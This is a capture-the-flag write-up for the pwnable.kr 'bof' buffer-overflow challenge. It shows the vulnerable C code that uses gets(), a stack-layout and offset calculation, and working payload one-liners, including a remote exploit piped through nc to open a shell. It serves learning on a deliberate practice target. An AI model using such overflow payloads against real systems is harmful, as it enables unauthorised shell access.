# bof

## 🧠 Overview
This challenge is a classic buffer overflow problem.

The goal is to overwrite a function argument (`key`) by overflowing a local buffer using `gets()`, and trigger a condition that executes a shell.

---

## 🔍 Source Code Analysis

```c
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);

    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
```

### Key Points

- `gets()` reads input without bounds → buffer overflow possible
- `overflowme` is 32 bytes
- The goal is to overwrite `key` with `0xcafebabe`

---

## 🧠 Stack Layout (32-bit)

From disassembly:

```asm
lea eax, [ebp-0x2c]     → buffer
cmp [ebp+0x8], value    → key
```

So the stack looks like:

```
[ebp+0x8]  key
[ebp+0x4]  return address
[ebp+0x0]  saved ebp
[ebp-0xc]  (canary or padding)
[ebp-0x2c] buffer (32 bytes)
```

---

## 📏 Offset Calculation

```
buffer start = ebp - 0x2c
key location = ebp + 0x8

distance = 0x2c + 0x8 = 0x34 = 52 bytes
```

---

## 🔑 Exploit

We need to:

1. Fill buffer (52 bytes)
2. Overwrite `key` with `0xcafebabe`

### Little Endian Conversion

```
0xcafebabe → \xbe\xba\xfe\xca
```

---

## 🚀 Payload

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52 + b"\xbe\xba\xfe\xca")'
```

---

## 🌐 Remote Exploit

```bash
(python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat) | nc pwnable.kr 9000
```

---

## ⚙️ Execution Flow

```
input → gets()
      → buffer overflow
      → overwrite key
      → key == 0xcafebabe
      → system("/bin/sh")
      → shell opened
```

---

## 📌 Why `cat` is used

```
(python ... ; cat) | nc ...
```

- `python` sends payload
- `cat` keeps stdin open
- allows interactive shell (id, ls, etc.)

---

## ⚠️ Note

- Local binaries may include stack canary protection
- The original challenge binary does not include it
- Therefore, the exploit works on the remote server but may fail locally

---

## 🧾 Summary

By overflowing a 32-byte buffer and writing 52 bytes of data followed by the target value (`0xcafebabe`), we overwrite the function argument and trigger `system("/bin/sh")` to gain a shell.
